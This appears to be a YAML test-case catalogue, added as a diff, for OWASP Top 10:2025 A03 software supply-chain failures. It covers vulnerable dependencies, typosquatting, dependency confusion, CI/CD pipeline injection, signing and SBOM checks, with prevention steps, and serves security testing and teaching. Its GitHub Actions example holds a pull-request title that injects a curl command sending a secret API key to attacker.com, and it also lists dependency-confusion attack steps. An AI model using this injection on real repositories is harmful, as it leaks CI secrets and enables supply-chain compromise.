@@ -1,0 +1,430 @@
+# Test Cases - A03: Software and Supply Chain Failures
+# OWASP Top 10:2025 A03 - Vulnerable and Outdated Components, Supply Chain Attacks
+
+category: "A03-software-supply-chain"
+owasp_2025: "A03"
+severity: "CRITICAL"
+description: "Testing for vulnerable dependencies, compromised packages, insecure CI/CD pipelines, and software supply chain attacks"
+
+cwe_mappings:
+  - "CWE-1104: Use of Unmaintained Third Party Components"
+  - "CWE-829: Inclusion of Functionality from Untrusted Control Sphere"
+  - "CWE-494: Download of Code Without Integrity Check"
+  - "CWE-506: Embedded Malicious Code"
+
+realworld_attacks:
+  solarwinds_2020:
+    description: "Compromised SolarWinds Orion software update"
+    impact: "18,000+ organizations affected including US government agencies"
+    attack_vector: "Backdoor inserted into build pipeline"
+    
+  log4shell_2021:
+    cve: "CVE-2021-44228"
+    description: "Remote Code Execution in Log4j library"
+    impact: "Billions of devices worldwide"
+    cvss: 10.0
+    
+  event_stream_2018:
+    description: "Compromised event-stream NPM package"
+    attack: "Malicious code stealing Bitcoin wallets"
+    
+  shai_hulud_2025:
+    description: "Self-propagating npm worm"
+    impact: "Package registry pollution"
+    attack: "Automated malicious package publication"
+
+test_cases:
+  - id: "SUPPLY-001"
+    name: "Vulnerable Dependency Detection"
+    description: "Identify outdated and vulnerable third-party libraries"
+    severity: "CRITICAL"
+    
+    detection_methods:
+      sbom_analysis:
+        - "Generate Software Bill of Materials (SBOM)"
+        - "Cross-reference with CVE databases"
+        - "Check National Vulnerability Database (NVD)"
+      
+      automated_scanning:
+        tools:
+          - "OWASP Dependency-Check"
+          - "Snyk"
+          - "npm audit"
+          - "pip-audit"
+          - "bundler-audit (Ruby)"
+          - "cargo audit (Rust)"
+          - "GitHub Dependabot"
+          - "Trivy"
+      
+      manual_verification:
+        - "Check package.json / requirements.txt / pom.xml"
+        - "Identify version numbers"
+        - "Search for known CVEs"
+    
+    common_vulnerable_libraries:
+      javascript:
+        - library: "lodash"
+          versions: "< 4.17.21"
+          cve: "CVE-2021-23337"
+          severity: "HIGH"
+        
+        - library: "axios"
+          versions: "< 0.21.1"
+          cve: "CVE-2020-28168"
+          severity: "MEDIUM"
+      
+      java:
+        - library: "log4j-core"
+          versions: "2.0-beta9 to 2.15.0"
+          cve: "CVE-2021-44228 (Log4Shell)"
+          severity: "CRITICAL"
+        
+        - library: "spring-core"
+          versions: "< 5.3.18"
+          cve: "CVE-2022-22965 (Spring4Shell)"
+          severity: "CRITICAL"
+      
+      python:
+        - library: "django"
+          versions: "< 3.2.13"
+          cve: "CVE-2022-28346"
+          severity: "HIGH"
+        
+        - library: "pillow"
+          versions: "< 9.0.0"
+          cve: "CVE-2022-22817"
+          severity: "HIGH"
+    
+    exploitation:
+      - "Identify vulnerable library version"
+      - "Search Exploit-DB / Metasploit"
+      - "Craft exploit for specific CVE"
+    
+    prevention:
+      - "Regular dependency updates"
+      - "Automated vulnerability scanning in CI/CD"
+      - "Pin dependency versions"
+      - "Use only trusted package repositories"
+      - "SBOM generation and tracking"
+  
+  - id: "SUPPLY-002"
+    name: "Package Repository Compromise"
+    description: "Test for malicious or compromised packages in dependencies"
+    severity: "CRITICAL"
+    
+    attack_vectors:
+      typosquatting:
+        description: "Register package with similar name"
+        examples:
+          - legitimate: "requests"
+            malicious: ["request", "requestes"]
+          - legitimate: "numpy"
+            malicious: ["nummpy", "numpi"]
+          - legitimate: "lodash"
+            malicious: ["loadash", "lodsh"]
+      
+      dependency_confusion:
+        description: "Upload internal package name to public repo"
+        attack: "Build system prefers public over private repo"
+        example: "company-internal-lib exists privately, upload to npm publicly"
+      
+      account_takeover:
+        - "Compromise maintainer account"
+        - "Publish malicious version"
+        - "Affects all downstream users"
+      
+      abandoned_packages:
+        - "Take over unmaintained package"
+        - "Insert backdoor in new version"
+    
+    detection:
+      - "Verify package names (check for typos)"
+      - "Check package maintainer reputation"
+      - "Review package download statistics"
+      - "Inspect package code before use"
+      - "Use package signing verification"
+      - "Monitor for unexpected dependency changes"
+    
+    red_flags:
+      - "Recently published package with high version number"
+      - "Few downloads but complex functionality"
+      - "Maintainer with no history"
+      - "Obfuscated or minified source code"
+      - "Unexpected network requests in code"
+    
+    tools:
+      - "Socket.dev: Package security scanner"
+      - "npm audit signatures"
+      - "pip-audit"
+      - "Ossf Scorecard: Risk assessment"
+    
+    prevention:
+      - "Use private package registry"
+      - "Dependency firewall (e.g., Sonatype Nexus)"
+      - "Package verification (checksum, signatures)"
+      - "Scope packages to prevent confusion attacks"
+      - "Review all new dependencies"
+  
+  - id: "SUPPLY-003"
+    name: "CI/CD Pipeline Security"
+    description: "Test for insecure CI/CD configurations and pipeline injection"
+    severity: "CRITICAL"
+    
+    attack_vectors:
+      pipeline_injection:
+        - "Inject malicious code via pull request"
+        - "Exploit CI/CD workflow triggers"
+        - "Example: GitHub Actions workflow_run trigger"
+      
+      secrets_exposure:
+        - "Extract secrets from CI/CD logs"
+        - "Access environment variables"
+        - "Steal API keys, cloud credentials"
+      
+      artifact_poisoning:
+        - "Compromise build artifacts"
+        - "Inject malware into releases"
+        - "Modify container images"
+    
+    testing_methodology:
+      github_actions:
+        - "Review .github/workflows/*.yml"
+        - "Check for pull_request_target trigger (dangerous)"
+        - "Verify secrets are not echoed"
+        - "Test for workflow injection: ${{ github.event.issue.title }}"
+      
+      jenkins:
+        - "Test for unauthenticated access"
+        - "Check script console access"
+        - "Review pipeline permissions"
+        - "Test for Groovy script injection"
+      
+      gitlab_ci:
+        - "Review .gitlab-ci.yml"
+        - "Check for unprotected variables"
+        - "Test artifact upload permissions"
+      
+      azure_devops:
+        - "Review azure-pipelines.yml"
+        - "Check service connection permissions"
+        - "Test for secret extraction"
+    
+    common_misconfigurations:
+      - "Secrets in plaintext in workflow files"
+      - "Overly permissive workflow triggers"
+      - "No artifact signing"
+      - "Insecure runner configurations"
+      - "Third-party actions without version pinning"
+    
+    exploitation_example:
+      github_actions_injection: |
+        # Vulnerable workflow
+        name: CI
+        on: [pull_request_target]
+        jobs:
+          build:
+            runs-on: ubuntu-latest
+            steps:
+              - run: echo "${{ github.event.pull_request.title }}"
+        
+        # Attack: Create PR with title: `"; curl http://attacker.com?secret=${{ secrets.API_KEY }};"`
+    
+    prevention:
+      - "Use pull_request instead of pull_request_target"
+      - "Never echo secrets or user input"
+      - "Pin third-party actions to commit SHA"
+      - "Use least privilege for CI/CD permissions"
+      - "Sign and verify artifacts"
+      - "Audit CI/CD logs for secrets"
+  
+  - id: "SUPPLY-004"
+    name: "Software Bill of Materials (SBOM) Validation"
+    description: "Verify SBOM completeness and accuracy"
+    severity: "MEDIUM"
+    
+    sbom_formats:
+      - "SPDX (Software Package Data Exchange)"
+      - "CycloneDX"
+      - "SWID (Software Identification Tags)"
+    
+    validation_checks:
+      - "All dependencies listed (direct + transitive)"
+      - "Version numbers accurate"
+      - "License information present"
+      - "Vulnerability data included"
+      - "Cryptographic hashes for integrity"
+    
+    tools:
+      - "Syft: SBOM generator"
+      - "CycloneDX CLI"
+      - "SPDX Tools"
+      - "FOSSA: License and security analysis"
+    
+    testing:
+      - "Generate SBOM for application"
+      - "Cross-reference with package manifests"
+      - "Check for missing or extra dependencies"
+      - "Verify hashes match actual files"
+    
+    prevention:
+      - "Generate SBOM in CI/CD"
+      - "Store SBOMs in artifact repository"
+      - "Continuous SBOM validation"
+      - "Integrate with vulnerability databases"
+  
+  - id: "SUPPLY-005"
+    name: "Unsigned Package Verification"
+    description: "Test for unsigned or tampered software packages"
+    severity: "HIGH"
+    
+    package_signing:
+      npm:
+        - "npm audit signatures"
+        - "Verify package provenance"
+      
+      python:
+        - "Check PGP signatures on PyPI"
+        - "Verify package hashes"
+      
+      java_maven:
+        - "Verify JAR signatures"
+        - "Check Maven Central GPG signatures"
+      
+      docker:
+        - "Docker Content Trust (Notary)"
+        - "Cosign for container signing"
+    
+    testing:
+      - "Download package"
+      - "Verify signature with publisher's public key"
+      - "Check if signature verification fails silently"
+      - "Test for signature bypass"
+    
+    exploitation:
+      - "Man-in-the-middle package download"
+      - "Serve malicious package without signature"
+      - "Downgrade to unsigned version"
+    
+    prevention:
+      - "Require signature verification"
+      - "Fail builds on unsigned packages"
+      - "Use TLS for package downloads"
+      - "Pin cryptographic hashes"
+  
+  - id: "SUPPLY-006"
+    name: "Container Image Vulnerability Scanning"
+    description: "Identify vulnerable base images and layers"
+    severity: "HIGH"
+    
+    scanning_tools:
+      - "Trivy"
+      - "Clair"
+      - "Anchore"
+      - "Snyk Container"
+      - "Aqua Security"
+      - "Docker Scout"
+    
+    testing_methodology:
+      - "Scan container images for CVEs"
+      - "Check base image freshness"
+      - "Identify outdated packages in layers"
+      - "Verify image signatures"
+    
+    common_issues:
+      - "Using 'latest' tag (unpredictable updates)"
+      - "Outdated base images"
+      - "Running as root user"
+      - "Unnecessary packages installed"
+      - "Secrets in image layers"
+    
+    best_practices:
+      - "Use minimal base images (Alpine, Distroless)"
+      - "Pin specific image versions"
+      - "Multi-stage builds"
+      - "Regular image rebuilds"
+      - "Remove unnecessary packages"
+  
+  - id: "SUPPLY-007"
+    name: "Dependency Confusion Attack"
+    description: "Test for internal package names exposed to public registries"
+    severity: "CRITICAL"
+    
+    attack_flow:
+      - step: 1
+        action: "Identify internal package names (e.g., @company/internal-lib)"
+        method: "Leaked package.json, error messages, OSINT"
+      
+      - step: 2
+        action: "Publish malicious package with same name to public registry"
+      
+      - step: 3
+        action: "Increase version number (e.g., 99.99.99)"
+      
+      - step: 4
+        action: "Build system installs public package instead of private"
+    
+    testing:
+      - "Review package manifests for internal packages"
+      - "Check if internal names exist on public registries"
+      - "Test build system package resolution order"
+    
+    prevention:
+      - "Use scoped packages (@company-scope/package)"
+      - "Configure registry to block public packages"
+      - "Pin exact versions"
+      - "Use .npmrc with scope-to-registry mapping"
+  
+  - id: "SUPPLY-008"
+    name: "License Compliance Violations"
+    description: "Identify incompatible or risky software licenses"
+    severity: "MEDIUM"
+    
+    risky_licenses:
+      copyleft:
+        - "GPL (requires open-sourcing derivative works)"
+        - "AGPL (network copyleft)"
+      
+      proprietary:
+        - "Custom restrictive licenses"
+        - "Non-commercial use only"
+    
+    tools:
+      - "FOSSA"
+      - "Black Duck"
+      - "FOSSology"
+      - "License Finder"
+    
+    testing:
+      - "Scan dependencies for licenses"
+      - "Identify GPL dependencies in proprietary software"
+      - "Check for license conflicts"
+    
+    prevention:
+      - "License whitelist policy"
+      - "Automated license scanning in CI/CD"
+      - "Legal review of dependencies"
+
+prevention_summary:
+  - "Maintain SBOM for all software"
+  - "Automated dependency scanning (Snyk, Dependabot)"
+  - "Package verification (signatures, hashes)"
+  - "Secure CI/CD pipelines"
+  - "Private package registries"
+  - "Regular dependency updates"
+  - "Vendor security assessments"
+
+tools:
+  - "OWASP Dependency-Check"
+  - "Snyk"
+  - "Trivy"
+  - "Syft (SBOM)"
+  - "Cosign (signing)"
+  - "Socket.dev"
+  - "GitHub Dependabot"
+
+references:
+  - "OWASP Top 10:2025 A03"
+  - "SLSA Framework (Supply Chain Levels for Software Artifacts)"
+  - "NIST SSDF (Secure Software Development Framework)"
+  - "CWE-1104: Use of Unmaintained Third Party Components"
+  - "in-toto: Supply chain integrity framework"
